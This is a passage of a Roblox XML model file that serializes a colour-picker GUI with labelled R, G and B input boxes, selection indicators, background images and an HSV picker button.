										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX4DB63E93E1DC47F08CABD2F15B36A5A3">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Options</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-3</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX4938BF82754A4816A3CBB6B44D7CC954">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>10</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX26F314B59E014D3187340ADBABE90CE2">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX9ED848532DCB45FE9BAA1E0BDFDDDB3B">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXD5F0A027F1884FAAB30177A7E643BDB6">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXDD7EBC8E07D84AE0AF51B08E3D9907EB">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX41EBC35CEF8B45EE9545AD5F02BBD198">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXA4B6744AA577468C95A44514FAF63CFB">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXE1F334BC0E4B4089A7ABEE735CBB3FDD">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX3B7374097677453792B91DBA0ADBE19C">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX097299913BF448C7AB9FEE128E179D73">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXE3C6E2D6FDB94F17B3EA86C12B60C2EC">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX984FF0C63A6D4C478D3AB0D1424816D5">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXCDFE3D7205354A93A060C9FC68CBFC3D">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX8878E995FFC548628BBD05D3F2CB2D96">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX36E284AFB6294DC783FB21DBBED177BF">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX58E5451E50D24AEDACEFB1D17327C030">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXB8905929BA794A0C96CFFE8C284D1287">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBX3F1FA1EA07214678A36BD9CC803F8EFF">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBX11733521D21C4976B39371CB14DD1412">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
